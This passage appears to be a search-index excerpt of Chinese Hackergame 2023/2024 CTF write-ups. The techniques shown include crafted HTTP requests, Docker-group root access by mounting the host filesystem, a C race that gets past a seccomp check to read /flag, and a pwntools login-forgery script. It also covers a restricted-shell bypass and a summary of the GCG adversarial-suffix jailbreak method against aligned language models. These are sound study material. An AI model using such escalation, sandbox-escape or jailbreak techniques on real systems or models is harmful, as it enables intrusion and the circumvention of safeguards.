Host: example.com\\r\\n If-Match: \"bfc13a64729c4290ef5b2c2730249c88ca92d82d\"\\r\\n\\r\\n 413 Content Too Large. \u4e0d\u9700\u8981\u771f\u6b63\u8f93\u5165\u5f88\u5927\u7684 payload\uff0c\u628a Content-length \u5f04\u5f97\u5f88\u5927\u5c31\u884c\uff1a GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Content-length: 1145141919810\\r\\n\\r\\n 414 URI Too Long. \u5927\u6982\u9700\u8981\u5f88\u957f\u7684 URI \u8def\u5f84\uff08\u4f46\u662f\u53c8\u4e0d\u80fd\u592a\u957f\uff0c\u5426\u5219 web \u754c\u9762\u672c\u4f53\u4e0d\u4f1a\u5141\u8bb8\u8fd9\u6837\u7684\u54cd\u5e94\uff09\u3002\u5185\u5bb9\u8be6\u89c1 414.txt \u3002 \u4ee5\u4e0a\u5c31\u5df2\u7ecf\u96c6\u6ee1\u4e86 12 \u4e2a\u3002\u5728\u9a8c\u9898\u65f6\u8fd8\u6709\u4e00\u4e2a HTTP code \u6f0f\u4e86\uff1a 501 Not Implemented. \u4ee3\u8868\u670d\u52a1\u5668\u4e0d\u652f\u6301\u6b64\u529f\u80fd\u3002Nginx \u6e90\u4ee3\u7801\u4e2d\u9ed8\u8ba4\u914d\u7f6e\u4e0b\u552f\u4e00\u53ef\u80fd\u89e6\u53d1\u7684\u5730\u65b9\u662f https://github.com/nginx/nginx/blob/a13ed7f5ed5bebdc0b9217ffafb75ab69f835a84/src/http/ngx_http_request.c#L2008 : } else { ngx_log_error ( NGX_LOG_INFO , r -> connection -> log , 0 , \"client sent unknown \\\" Transfer-Encoding \\\" : \\\" %V \\\" \" , & r -> headers_in . transfer_encoding -> value ); ngx_http_finalize_request ( r , NGX_HTTP_NOT_IMPLEMENTED ); return NGX_ERROR ; } else \u4e0a\u9762\u53ea\u5141\u8bb8 chunked \uff0c\u6240\u4ee5\u53ef\u4ee5\uff1a GET / HTTP/1.1\\r\\n Transfer-Encoding: gzip\\r\\n Host: example.com\\r\\n\\r\\n gzip \u6362\u6210\u9664\u4e86 chunked \u4ee5\u5916\u7684\u4efb\u610f\u5b57\u7b26\u4e32\u90fd\u884c\u3002 \u6700\u540e\u4e00\u4e2a\u95ee\u9898\uff1a\u6ca1\u6709\u72b6\u6001\u7801\u662f\u600e\u4e48\u56de\u4e8b\uff1f GET /\\r\\n \u8fd9\u91cc\u5b9e\u9645\u53d1\u9001\u7684\u662f HTTP/0.9 \u8bf7\u6c42\uff0c\u5b83\u53ea\u652f\u6301 GET \uff0c\u7136\u540e\u540e\u9762\u76f4\u63a5\u63a5 URL\uff0c\u6ca1\u6709\u522b\u7684\u3002\u7136\u540e\u54cd\u5e94\u5c31\u76f4\u63a5\u54cd\u5e94\u6587\u4ef6\u5185\u5bb9\uff0c\u4e5f\u6ca1\u6709\u72b6\u6001\u7801\u4e4b\u7c7b\u7684\u4e1c\u897f\u3002","title":"HTTP \u96c6\u90ae\u518c"},{"location":"ctf/writeups/hackergame2023/#docker-for-everyone","text":"\u8fd9\u9898\u8003\u70b9\u5c31\u662fdocker\u7528\u6237\u7ec4\u4e0eroot\u5176\u5b9e\u662f\u7b49\u4ef7\u7684\uff0c\u56e0\u6b64\u76f4\u63a5\u542f\u52a8\u4e00\u4e2a\u5bb9\u5668\u628aflag\u6302\u8f7d\u8fdb\u5bb9\u5668\u5373\u53ef\u5728\u5bb9\u5668\u5185\u8bfb\u53d6\u3002\u53e6\u5916\u6ce8\u610f\u4e00\u4e0b\u8f6f\u8fde\u63a5\u7684\u95ee\u9898\u5373\u53ef\u3002 docker run -it --rm -v /:/outside alpine","title":"Docker for Everyone"},{"location":"ctf/writeups/hackergame2023/#20","text":"\u76f4\u63a5\u66b4\u529b\u7a77\u4e3e\u5373\u53ef\uff0c\u5176\u5b9e\u6ee1\u8db3\u6761\u4ef6\u7684\u60c5\u51b5\u5f88\u591a\uff0c\u76f4\u63a5\u8fb9\u8dd1\u8fb9\u8f93\u51fa\u5c31\u5f88\u5feb\u80fd\u62ff\u5230flag\u4e86\u3002 \u89e3\u9898\u4ee3\u7801\uff08\u8fc7\u4e8e\u66b4\u529b\uff09 cod_dict = [] cod_dict += [ 'nymeh1niwemflcir}echaet' ] cod_dict += [ 'a3g7}kidgojernoetlsup?h' ] cod_dict += [ 'ulw!f5soadrhwnrsnstnoeq' ] cod_dict += [ 'ct{l-findiehaai{oveatas' ] cod_dict += [ 'ty9kxborszstguyd?!blm-p' ] def get_cod_dict ( c_dict ): return '' . join ( c_dict ) def decrypt_data ( input_codes ): flags = [] for k in range ( 23 ): print ( k ) for j in range ( 23 ): for t in range ( 23 ): for p in range ( 23 ): for f in range ( 23 ): cd_dict = cod_dict . copy () cd_dict [ 0 ] = cod_dict [ 0 ][: k ] + cod_dict [ 0 ][ k ] + cod_dict [ 0 ][ k :] cd_dict [ 1 ] = cod_dict [ 1 ][: j ] + cod_dict [ 1 ][ j ] + cod_dict [ 1 ][ j :] cd_dict [ 2 ] = cod_dict [ 2 ][: t ] + cod_dict [ 2 ][ t ] + cod_dict [ 2 ][ t :] cd_dict [ 3 ] = cod_dict [ 3 ][: p ] + cod_dict [ 3 ][ p ] + cod_dict [ 3 ][ p :] cd_dict [ 4 ] = cod_dict [ 4 ][: f ] + cod_dict [ 4 ][ f ] + cod_dict [ 4 ][ f :] print ( cd_dict ) st_dict = get_cod_dict ( cd_dict ) output_chars = [ st_dict [ c ] for c in input_codes ] if 'flag{' in '' . join ( output_chars ): flags . append ( '' . join ( output_chars )) return flags flags = decrypt_data ([ 53 , 41 , 85 , 109 , 75 , 1 , 33 , 48 , 77 , 90 , 17 , 118 , 36 , 25 , 13 , 89 , 90 , 3 , 63 , 25 , 31 , 77 , 27 , 60 , 3 , 118 , 24 , 62 , 54 , 61 , 25 , 63 , 77 , 36 , 5 , 32 , 60 , 67 , 113 , 28 ]) print ( set ( flags ))","title":"\u60dc\u5b57\u5982\u91d1 2.0"},{"location":"ctf/writeups/hackergame2023/#_6","text":"\u9898\u76ee\u4e2d\u7ed9\u7684\u662fasciinema\u5f55\u50cf\u6587\u4ef6\uff0c\u76f4\u63a5 asciinema cat \u5373\u53ef\u5f97\u5230\u5b57\u8282\u6d41\uff0c\u4e0d\u8fc7\u4f1a\u6709\u5f88\u591a\u989d\u5916\u4e0d\u9700\u8981\u7684\u4e1c\u897f\uff0c\u5220\u8d77\u6765\u6bd4\u8f83\u9ebb\u70e6\uff0c\u770b\u5230asciinema\u5f55\u5236\u7684\u65f6\u5019\u6709raw\u9009\u9879\uff0c\u4e8e\u662f\u91cd\u65b0\u5f55\u4e86\u4e00\u904d\uff0c\u8fd9\u6837\u5b57\u8282\u6d41\u5c31\u5e72\u51c0\u5f88\u591a\uff0c\u7a0d\u5fae\u6539\u4e00\u4e0b\uff0c\u8fd0\u884c\u5373\u53ef\u3002","title":"\ud83e\ude90 \u9ad8\u9891\u7387\u661f\u7403"},{"location":"ctf/writeups/hackergame2023/#_7","text":"\u5f88\u65b0\u9896\u7684AI\u9898\u76ee\uff0c\u5bf9\u4e8e\u6211\u6765\u8bf4\u53ea\u80fd\u4e71\u8bd5\uff0c\u7b2c\u4e00\u95ee\u76f4\u63a5\u7528repeat\u5927\u6cd5\u5c31\u53ef\u5b8c\u6210\u3002 \u7b2c\u4e8c\u95ee\u5176\u5b9e\u601d\u8def\u5bf9\u7684\uff0c\u4e0d\u8fc7\u6211\u5acc\u9ebb\u70e6\uff0c\u6ca1\u6709\u53bb\u7a77\u4e3ehhh\u3002 \u540e\u9762\u4e24\u95ee\u786e\u5b9e\u53ef\u4ee5\u7684\uff0c\u5b66\u4e60\u4e86\u3002 \u5b98\u65b9\u9898\u89e3","title":"\ud83e\ude90 \u5c0f\u578b\u5927\u8bed\u8a00\u6a21\u578b\u661f\u7403"},{"location":"ctf/writeups/hackergame2023/#llm-attacks","text":"\u8bba\u6587\uff1a Universal and Transferable Adversarial Attacks on Aligned Language Models","title":"LLM Attacks"},{"location":"ctf/writeups/hackergame2023/#background","text":"\u4e00\u4e2a Decoder-Only \u7684 LLM \u5c06\u4e00\u4e32 token \\(x_{1:n}\\) \u6620\u5c04\u5230\u4e0b\u4e00\u4e2a token \\(x_{n+1}\\) \u3002\u8bed\u8a00\u6a21\u578b\u6240\u9700\u8981\u5b66\u4e60\u7684\u5219\u662f\u5728\u7ed9\u5b9a\u4e4b\u524d\u7684 token \\(x_{1:n}\\) \uff0c\u5f97\u5230\u4e0b\u4e00\u4e2a token \\(x_{n+1}\\) \u7684\u6982\u7387 \\(p(x_{n+1} | x_{1:n})\\) \u3002\u5176\u4e2d\u6bcf\u4e00\u4e2a \\(x_i \\in {1, ... V}\\) \u90fd\u662f\u8bcd\u8868\u4e2d\u7684\u4e00\u4e2a token\u3002\u5982\u679c\u60f3\u8981\u8ba9\u6a21\u578b\u8f93\u5165\u4e00\u6bb5\u5e8f\u5217\uff0c\u5e8f\u5217\u4e2d\u6bcf\u4e00\u4e2a token \u90fd\u53ea\u4e0e\u4e4b\u524d\u7684\u6240\u6709 token \u6709\u5173\uff0c\u56e0\u6b64\u6a21\u578b\u8f93\u51fa\u4e00\u6bb5\u5e8f\u5217 \\(x_{n+1:n+H}\\) \u7684\u6982\u7387\u4e3a \\[p(x_{n+1:n+H}|x_{1:n}) = \\prod_{i=1}^H p(x_{n+i} | x_{1:n+i-1})\\]","title":"Background"},{"location":"ctf/writeups/hackergame2023/#method","text":"\u5982\u679c\u6211\u4eec\u5e0c\u671b\u6a21\u578b\u80fd\u591f\u8f93\u51fa\u4e00\u4e2a\u6307\u5b9a\u7684\u5e8f\u5217\uff0c\u5c31\u662f\u5e0c\u671b \\(p(x_{n+1:n+H}|x_{1:n})\\) \u5c3d\u53ef\u80fd\u9ad8\uff0c\u4ee5\u6b64\u51fa\u53d1\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u4f18\u5316\u76ee\u6807 \\[\\mathcal{L}(x_{1:n}) = -\\log p(x^\\star_{n+1:n+H} | x_{1:n})\\] \u4f46\u662f\u4e0e\u5e38\u89c1\u7684\u56fe\u7247\u4e0a\u9762\u7684\u5bf9\u6297\u6837\u672c\u653b\u51fb\u4e0d\u540c\uff0cLLM \u7684\u8f93\u5165\u662f\u76f8\u5bf9\u79bb\u6563\u7684 token\uff0c\u65e0\u6cd5\u8fdb\u884c\u8fde\u7eed\u7684\u53d8\u5316\u3002\u56e0\u6b64\u4f5c\u8005\u6839\u636e AutoPrompt [1]\uff0c\u8bbe\u8ba1\u4e86 Greedy Coordinate Gradient \u6765\u5c3d\u53ef\u80fd\u9ad8\u6548\u5730\u5bf9\u79bb\u6563\u7684\u8f93\u5165\u8fdb\u884c\u4f18\u5316\u3002 \u901a\u4fd7\u6765\u8bb2\uff0c\u6211\u4eec\u5e0c\u671b\u80fd\u591f\u5c06\u539f\u6709\u8f93\u5165\u7684 Prompt \u4e2d\u7684\u67d0\u4e00\u4e9b token \u66ff\u6362\u4e3a\u65b0\u7684 token\uff0c\u5e76\u4e14\u8ba9\u66ff\u6362\u4e4b\u540e\u5c3d\u53ef\u80fd\u8ba9\u8f93\u51fa\u7684 target loss \u5c3d\u53ef\u80fd\u964d\u4f4e\u3002 \u4f5c\u8005\u7528\u4e00\u4e2a\u957f\u5ea6\u4e3a \\(V\\) \u7684 one hot \u5411\u91cf\u6765\u4ee3\u8868\u5f53\u524d\u4f4d\u7f6e\u7684 token\uff0c\u8be5 one hot \u5411\u91cf\u4e0e embedding layer\uff08\u5927\u5c0f\u4e3a \\(R^{\\mathrm{dim} \\times V}\\) \uff09\u76f8\u4e58\u540e\u53ef\u4ee5\u5f97\u5230\u8be5 token \u5bf9\u5e94\u7684 embedding\uff0c\u8be5 embedding \u88ab\u8f93\u5165\u7ed9\u4e86\u6a21\u578b\u3002\u5728\u53cd\u5411\u4f20\u64ad\u540e\uff0cone hot \u5411\u91cf\u7684\u6bcf\u4e00\u4e2a\u4f4d\u7f6e \\(i\\) \u90fd\u6709\u5bf9\u5e94\u7684\u68af\u5ea6 \\(\\mathrm{grad}_i\\) \uff0c \\(\\mathrm{grad}_i < 0\\) \u8bf4\u660e\u5982\u679c\u5c06\u539f\u672c\u7684 token \u66ff\u6362\u4e3a\u8bcd\u8868\u4e2d\u7684\u7b2c \\(i\\) \u4e2a token\uff0c\u80fd\u591f\u4f7f\u5f97\u8f93\u51fa\u7684 loss \u4e0b\u964d\u3002 \u57fa\u4e8e\u8fd9\u4e2a\u68af\u5ea6\uff0c\u6211\u4eec\u9009\u51fa\u4e86 top-k \u4e2a\u6700\u5c0f\u7684\u66ff\u6362 token\uff08\u7b97\u6cd5\u7684\u7b2c 4 \u884c\uff09\u3002\u7136\u540e\u6211\u4eec\u968f\u673a\u9009\u62e9 prompt \u7684 token \u7684\u4f4d\u7f6e\uff0c\u5c06\u5176\u968f\u673a\u66ff\u6362\u4e3a\u68af\u5ea6\u6700\u5c0f\u7684 k \u4e2a\u4e4b\u4e00\u3002\u91cd\u590d\u4e0a\u8ff0\u66ff\u6362\u591a\u6b21\uff0c\u9009\u62e9\u51fa\u66ff\u6362\u540e loss \u6700\u5c0f\u7684 prompt \u4f5c\u4e3a\u4e0b\u4e00\u6b21\u8fed\u4ee3\u7684\u521d\u59cb\u503c\u3002 [1]: AutoPrompt: Eliciting Knowledge from Language Models with Automatically Generated Prompts. https://arxiv.org/abs/2010.15980","title":"Method"},{"location":"ctf/writeups/hackergame2023/#_8","text":"\u9700\u8981\u77e5\u9053\u56fe\u50cf\u7684\u957f\u5bbd\uff0c\u600e\u4e48\u529e\u5462\uff1f\u624b\u52a8plot\u51fa\u6765\u770b\u5457\uff0c\u53cd\u6b63\u8bd5\u4e00\u4e0b\u5f88\u5bb9\u6613\u627e\u5230\u5468\u671f\u6027\u91cd\u590d\u7684\u4e1c\u897f\uff0c\u7136\u540e\u5fae\u8c03\u4e00\u4e0b\u5f97\u5230\u957f\u5bbd\uff0c\u76f4\u63a5\u8f93\u51fa\u89c6\u9891\u5373\u53ef\u3002 Done import cv2 import numpy as np def restore_video ( buffer , output ): frame_width = 427 frame_height = 759 frame_count = 139 video_writer = cv2 . VideoWriter ( output , cv2 . VideoWriter_fourcc ( * \"mp4v\" ), 30.0 , ( frame_width , frame_height )) for i in range ( frame_count ): frame = buffer [ i ] . astype ( np . uint8 ) video_writer . write ( frame ) video_writer . release () if __name__ == \"__main__\" : with open ( \"video.bin\" , \"rb\" ) as input_file : buffer = np . fromfile ( input_file , dtype = np . uint8 ) print ( buffer . shape ) num = [ 2 , 5 , 8 , 11 , 14 , 17 , 20 , 23 , 26 , 29 , 32 , 35 , 38 , 41 , 44 , 47 , 50 , 53 , 56 , 59 , 62 , 65 , 68 , 71 , 74 , 77 , 80 , 83 , 86 , 89 , 92 , 95 , 98 ] nums = [] f = np . append ( buffer , np . zeros ( 93 , dtype = np . uint8 )) f = f . reshape (( - 1 , 759 , 427 , 3 )) restore_video ( f , \"video.mp4\" )","title":"\ud83e\ude90 \u6d41\u5f0f\u661f\u7403"},{"location":"ctf/writeups/hackergame2023/#_9","text":"\u8fd9\u4e00\u9898\u7b2c\u4e00\u95ee\u6ca1\u4ec0\u4e48\u95ee\u9898\uff0c\u968f\u4fbf\u538b\u7f29\u4e00\u4e0b\u5c31\u80fd\u8fc7\u3002\u7b2c\u4e8c\u9898\u6709\u70b9\u6298\u78e8\uff0c\u601d\u8def\u662f\u5bf9\u7684\uff0c\u53bb\u627e libvips \u652f\u6301\u7684\u56fe\u50cf\u683c\u5f0f\uff0c\u5c31\u662f\u6211\u592a\u61d2\u4e86\u6ca1\u53bb\u4ed4\u7ec6\u7ffb\uff0c\u4e00\u4e2a\u52b2\u5730\u7422\u78e8SVG\u53bb\u4e86\uff0c\u5bfc\u81f4\u6ca1\u505a\u51fa\u6765\uff0c\u5f88\u53ef\u60dc\u3002\u8fd9\u9053\u9898\u7528JXL\u7684\u683c\u5f0f\u6765\u89e3\u7684\u3002","title":"\ud83e\ude90 \u4f4e\u5e26\u5bbd\u661f\u7403"},{"location":"ctf/writeups/hackergame2023/#komm-susser-flagge","text":"\u8fd9\u9053\u9898\u5c31\u662f\u5bf9TCP/IP\u6570\u636e\u5305\u7684\u4fee\u6539\uff0c\u7b2c\u4e00\u95ee\u76f4\u63a5\u4e00\u4e2a\u5b57\u8282\u4e00\u4e2a\u5b57\u8282\u53d1\u9001\u5373\u53ef\u7ed5\u8fc7\uff0c\u7b2c\u4e8c\u95ee\u5176\u5b9e\u975e\u9884\u671f\u4e86\uff0c\u56e0\u4e3a\u4e00\u4e2a\u5b57\u8282\u6ca1\u6709\u5230u32\u7684\u8981\u6c42\uff0c\u76f4\u63a5\u7ed5\u8fc7\u4e86hhh\u3002 \u7b2c\u4e09\u95ee\u601d\u8def\u5176\u5b9e\u5bf9\u4e86\uff0c\u5c31\u662f\u4fee\u6539TCP\u4e2d\u7684OPTION\u90e8\u5206\uff0c\u4e0d\u8fc7\u5f53\u65f6\u5f88\u5fd9\uff0c\u7528python\u5199\u7684\u6709\u70b9\u5947\u602a\uff0c\u6ca1\u7ec6\u8c03\uff0c\u5982\u679c\u7a7a\u95f2\u7684\u8bdd\u5e94\u8be5\u505a\u51fa\u6765\u6ca1\u95ee\u9898\u3002","title":"Komm, s\u00fcsser Flagge"},{"location":"ctf/writeups/hackergame2023/#flag_1","text":"\u7b2c\u4e00\u95ee\u5f88easy\u76f4\u63a5\u9759\u6001\u7f16\u8bd1\u540e\u63d0\u4ea4\u5373\u53ef\u3002\u7b2c\u4e8c\u95ee\u770b\u4e86\u5b98\u65b9\u9898\u89e3\u4e4b\u540e\uff0c\u77e5\u9053\u8981\u591a\u770b\u6ce8\u91ca\uff0c\u7528\u7ebf\u7a0b\u7684\u65b9\u5f0f\u6765\u7ed5\u8fc7seccomp\uff0c\u5b66\u4e60\u4e86\u3002 \u5b98\u65b9\u9898\u89e3 #include <stdio.h> #include <pthread.h> #include <fcntl.h> #include <unistd.h> #include <stdlib.h> #include <time.h> char flagfile [] = \"/flag\" ; void * read_file () { char buf [ 100 ] = {}; while ( 1 ) { int f = open ( flagfile , O_RDONLY ); if ( ! f ) { continue ; } read ( f , buf , 99 ); if ( buf [ 0 ] && buf [ 0 ] != 'I' ) { printf ( \"%s \\n \" , buf ); exit ( 0 ); } close ( f ); } } void * modify () { struct timespec req ; req . tv_sec = 0 ; req . tv_nsec = 50 ; while ( 1 ) { flagfile [ 1 ] = 'a' ; // sleep is not allowed. So just don't sleep. // nanosleep(&req, NULL); flagfile [ 1 ] = 'f' ; } } int main () { printf ( \"pthread \\n \" ); pthread_t t1 , t2 ; pthread_create ( & t1 , NULL , read_file , NULL ); pthread_create ( & t2 , NULL , modify , NULL ); pthread_join ( t1 , NULL ); pthread_join ( t2 , NULL ); printf ( \"done? \\n \" ); return 0 ; }","title":"\u4e3a\u4ec0\u4e48\u8981\u6253\u5f00 /flag \ud83d\ude21"},{"location":"ctf/writeups/hackergame2023/#_10","text":"\u5f88\u597d\u73a9\u7684\u5c0f\u6e38\u620f\uff0c\u5c31\u5f53\u653e\u677e\u4e00\u4e0b\uff0c\u903b\u8f91\u5f88\u7b80\u5355\uff08\u5c0f\u5fc3\u7206\u70b8\uff0c\u7b2c\u4e00\u6b21\u5fd8\u8bb0\u5148\u901a\u51b7\u5374\u6db2\u4e86","title":"\u5f02\u661f\u6b67\u9014"},{"location":"ctf/writeups/hackergame2023/#20_1","text":"\u8fd9\u9053\u9898\u5f88\u70e6\uff0c\u5c31\u662f\u611f\u89c9\u81ea\u5df1\u5feb\u505a\u51fa\u6765\u4e86\uff0c\u5c31\u5dee\u4e00\u70b9\u70b9\uff0c\u6240\u4ee5\u9700\u8981\u603b\u7ed3\u4e00\u4e0b\u7ecf\u9a8c\u6559\u8bad\u3002 \u5176\u5b9e\u4e5f\u6ca1\u4ec0\u4e48\u597d\u603b\u7ed3\u7684\uff0c\u5c31\u662f\u6ca1\u6ce8\u610f\u5230 updateElement \uff0c\u5bfc\u81f4\u4e0d\u77e5\u9053\u600e\u4e48\u7ed5\u8fc7\u957f\u5ea6\u9650\u5236\u3002\u4e5f\u662f\u81ea\u5df1\u83dc\uff0c\u5176\u5b9e\u6ca1\u600e\u4e48\u505a\u8fc7XSS\u7684\u9898\u76ee\uff0c\u8fd8\u662f\u9700\u8981\u79ef\u7d2f\u7ecf\u9a8c\uff0c\u611f\u89c9\u597d\u7684XSS\u9898\u76ee\u4e0d\u591a\u3002","title":"\u5fae\u79ef\u5206\u8ba1\u7b97\u5c0f\u7ec3\u4e60 2.0"},{"location":"ctf/writeups/hackergame2023/#f5","text":"\u8fd9\u9053\u9898\u8bb0\u5f55\u4e00\u4e0b\uff0c\u56e0\u4e3a\u9006\u5411\u7684\u9898\u76ee\u505a\u5f97\u5c11\uff0c\u6240\u4ee5\u9700\u8981\u79ef\u7d2f\u4e00\u4e0b\u3002 \u5b98\u65b9\u9898\u89e3\u4e2d\u9700\u8981\u8bb0\u5f55\u7684\u4e60\u60ef import angr , monkeyhex , claripy proj = angr . Project ( 'no_need_for_F5/main.exe' ) flag_chars = [ claripy . BVS ( 'flag_ %d ' % i , 8 ) for i in range ( 32 )] flag = claripy . Concat ( * [ claripy . BVV ( b 'flag{' )] + flag_chars + [ claripy . BVV ( b '} \\x00 ' )]) state = proj . factory . call_state ( 0x140001000 ) input_addr = 0 @proj . hook ( 0x140001093 , length = 5 ) def get_input ( state ): global input_addr input_addr = state . regs . rdx state . memory . store ( input_addr , flag ) print ( 'Input done' ) @proj . hook ( 0x140001079 , length = 5 ) def printf ( state ): return simgr = proj . factory . simgr ( state ) simgr . explore ( find = 0x1400013A1 , avoid = 0x1400013B7 ) simgr . found [ 0 ] . solver . eval ( flag ) . to_bytes ( 39 , \"big\" )","title":"\u9006\u5411\u5de5\u7a0b\u4e0d\u9700\u8981 F5"},{"location":"ctf/writeups/hackergame2023/#o1","text":"\u6839\u636e\u54c8\u5e0c\u4e66\u7684\u7279\u6027\uff0c\u56e0\u6b64\u6211\u4eec\u53ea\u9700\u8981\u6784\u9020\u4e00\u4e2a\u7528\u6237\uff0c\u4f7f\u5f97\u5b83\u7684SHA1\u503c\u7b49\u4ef7\u4e8e\u5176\u5b50\u8282\u70b9\u5b58\u5728admin\u7528\u6237\u5373\u53ef\u3002\u8fd9\u91cc\u6ce8\u610f\u9700\u8981SHA1\u503c\u80fd\u591f\u88abUTF-8\u89e3\u7801\u5373\u53ef\u3002 \u8fd9\u91cc\u6211\u5148\u627e\u4e86\u5982\u4e0b\u4e24\u4e2a\u7528\u6237\uff1a admin:aaaadcLd admin:aaaaanRH \u8fd9\u91cc\u5176\u5b9e\u53ef\u4ee5\u968f\u4fbf\u641c\u7d22\uff0c\u4e0b\u9762\u90fd\u4ee3\u7801\u6539\u4e00\u4e0b\u90fd\u53ef\u4ee5\u641c\uff0c\u968f\u4fbf\u641c\u3002 \u641c\u7d22\u5408\u9002\u7684admin\u7528\u6237 from itertools import product str1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' prefix = 'admin:' for i in product ( str1 , repeat = 8 ): user = prefix + '' . join ( i ) x = f ( user . encode ()) # x = com(x, x) if b ':' not in x : try : x . decode () print ( user , x ) except : pass \u7136\u540e\u5c31\u7b97\u4e00\u4e0bSHA1\u540e\u62fc\u63a5\u5373\u53ef\uff0c\u89e3\u9898\u811a\u672c\u5982\u4e0b\uff1a \u89e3\u9898\u811a\u672c\uff08\u4fee\u6539\u7248\uff0c\u539f\u7248\u592a\u6742\u4e71\u4e86\uff09 from hashlib import sha1 from pwn import * f = lambda data : sha1 ( data ) def com ( x , y ): if isinstance ( x , bytes ): t = x else : t = x . digest () if isinstance ( y , bytes ): p = y else : p = y . digest () if t > p : t , p = p , t return t + p if __name__ == '__main__' : p = remote ( '202.38.93.111' , 10094 ) token = b '2269:MEUCIFS9KtX84tx7Ri01S4JNBKL/H1pJ2+sHChO3/WlK7QsXAiEA5cTIFBDrdJQfvOANFq0hGHLglZHY31APxc62zvSnKug=' p . recvuntil ( 'token:' ) p . sendline ( token ) p . recvuntil ( 'Choice:' ) p . sendline ( b '1' ) def sendu ( data ): p . recvuntil ( '>' ) p . sendline ( data ) test0 = [ b 'admin:aaaadcLd' , b 'admin:aaaaanRH' ] test1 = b 'a:a' test3 = com ( f ( test0 [ 0 ]), f ( test0 [ 1 ])) sendu ( test1 ) sendu ( test3 ) sendu ( b 'EOF' ) p . recvuntil ( 'Choice:' ) p . sendline ( b '2' ) p . recvuntil ( 'Login credential: ' ) p . sendline ( test0 [ 0 ] . decode () + ':' + f ( test0 [ 1 ]) . hexdigest () + sha1 ( test1 ) . hexdigest ()) p . interactive ()","title":"O(1) \u7528\u6237\u767b\u5f55\u7cfb\u7edf"},{"location":"ctf/writeups/hackergame2023/#_11","text":"\u540e\u9762\u7684\u9898\u76ee\u5176\u5b9e\u6ca1\u600e\u4e48\u770b\uff0c\u5c31\u6682\u65f6\u5148\u4e0d\u5199\u4e86\uff0c\u7b49\u4ee5\u540e\u6709\u65f6\u95f4\u7a7a\u4e86\u7814\u7a76\u540e\u518d\u8bb0\u5f55\u4e00\u4e0b\u5427\u3002","title":"\u5176\u4ed6"},{"location":"ctf/writeups/hackergame2024/","text":"Hackergame 2024 \u00b6 Abstract \u8fd9\u5df2\u7ecf\u662f\u53bb\u5e74\u7684\u8d5b\u4e8b\u4e86\uff0c\u8bb0\u5f97\u662fZJUCTF2024\u540e\u7684\u8d81\u70ed\u6253\u94c1\uff0c\u5230\u4e862025\u5e74\u4e86\u624d\u6765\u66f4\u4e00\u4e0bxs\u3002\u4e0d\u8fc7\u611f\u89c9\u4ee5\u540e\u8d8a\u6765\u8d8a\u5fd9\u5e94\u8be5\u4e5f\u6ca1\u4ec0\u4e48\u65f6\u95f4\u5927\u6253\u4e86\uff0c\u5584\u59cb\u5584\u7ec8\u5427\uff0c\u4f46\u662f\u56e0\u4e3a\u592a\u4e45\u8fdc\u4e86\uff0c\u6240\u4ee5\u5c31\u6311\u51e0\u9053\u5370\u8c61\u6df1\u523b\u7684\u5199\u4e00\u5199 \u5b98\u65b9\u9898\u89e3\uff1a Hackergame 2024 \u6bcf\u65e5\u8bba\u6587\u592a\u591a\u4e86 \u00b6 \u6ca1\u60f3\u5230\u771f\u6709\u4eba\u628aflag\u85cf\u8bba\u6587\u4e2d\u54c8\u54c8\u54c8\u54c8\uff0c\u9898\u76ee\u5f88\u7b80\u5355\u641c\u4e00\u4e0bflag\uff0c\u7136\u540e\u79fb\u52a8\u4e00\u4e0b\u5143\u7d20\u5c31\u80fd\u770b\u5230\u3002 \u8bba\u6587\u94fe\u63a5 PowerfulShell \u00b6 \u9898\u76ee\u903b\u8f91 #!/bin/bash FORBIDDEN_CHARS = \"'\\\";,.%^*?!@#%^&()><\\/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0\" PowerfulShell () { while true ; do echo -n 'PowerfulShell@hackergame> ' if ! read input ; then echo \"EOF detected, exiting...\" break fi if [[ $input = ~ [ $FORBIDDEN_CHARS ] ]] ; then echo \"Not Powerful Enough :)\" exit else eval $input fi done } PowerfulShell \u6838\u5fc3\u601d\u8def\u5c31\u662f\u5229\u7528\u4ec5\u5269\u7684 $-_~{}1-9: \u6765\u6784\u9020Payload\uff0c\u6839\u636e\u5df2\u77e5\uff0c\u6211\u4eec\u6613\u5f97 ~ \u53ef\u4ee5\u83b7\u53d6 $HOME \uff0c\u5373 /player \uff0c\u800c $- \u662f hB \uff0c\u90a3\u4e48\u6211\u4eec\u8f7b\u800c\u6613\u4e3e\u7684\u5c31\u80fd\u6784\u9020\u51fa\u5f88\u591a\u5e38\u89c1\u7684\u547d\u4ee4\uff0c\u6bd4\u5982 ls \uff0c cat \u7b49\u7b49\uff0c\u7136\u540e\u5c31\u80fd\u62ff\u5230flag\u4e86\u3002 \u5f3a\u5927\u7684\u6b63\u5219\u8868\u8fbe\u5f0f \u00b6 \u5f88\u6709\u610f\u601d\u7684\u4e00\u9898\uff0c\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u6765\u5b9e\u73b0\u6570\u5b57\u662f\u5426\u6574\u9664\uff0c\u751a\u81f3CRC\u6821\u9a8c\uff0c\u56e0\u4e3a\u4e0d\u662f\u7b97\u6cd5\u51fa\u8eab\uff0c\u8fd8\u662f\u7b2c\u4e00\u6b21\u4e86\u89e3\u5230\uff0c\u5b66\u4e60\u4e86\u3002 \u9898\u76ee\u4ee3\u7801 import re import random # pip install libscrc import libscrc allowed_chars = \"0123456789()|*\" max_len = 1000000 num_tests = 300 difficulty = int ( input ( \"Enter difficulty level (1~3): \" )) if difficulty not in [ 1 , 2 , 3 ]: raise ValueError ( \"Invalid difficulty level\" ) regex_string = input ( \"Enter your regex: \" ) . strip () if len ( regex_string ) > max_len : raise ValueError ( \"Regex string too long\" ) if not all ( c in allowed_chars for c in regex_string ): raise ValueError ( \"Invalid character in regex string\" ) regex = re . compile ( regex_string ) for i in range ( num_tests ): expected_result = ( i % 2 == 0 ) while True : t = random . randint ( 0 , 2 ** 64 ) # random number for testing if difficulty == 1 : test_string = str ( t ) # decimal if ( t % 16 == 0 ) == expected_result : # mod 16 break elif difficulty == 2 : test_string = bin ( t )[ 2 :] # binary if ( t % 13 == 0 ) == expected_result : # mod 13 break elif difficulty == 3 : test_string = str ( t ) # decimal if ( libscrc . gsm3 ( test_string . encode ()) == 0 ) == expected_result : # crc break else : raise ValueError ( \"Invalid difficulty level\" ) regex_result = bool ( regex . fullmatch ( test_string )) if regex_result == expected_result : print ( \"Pass\" , test_string , regex_result , 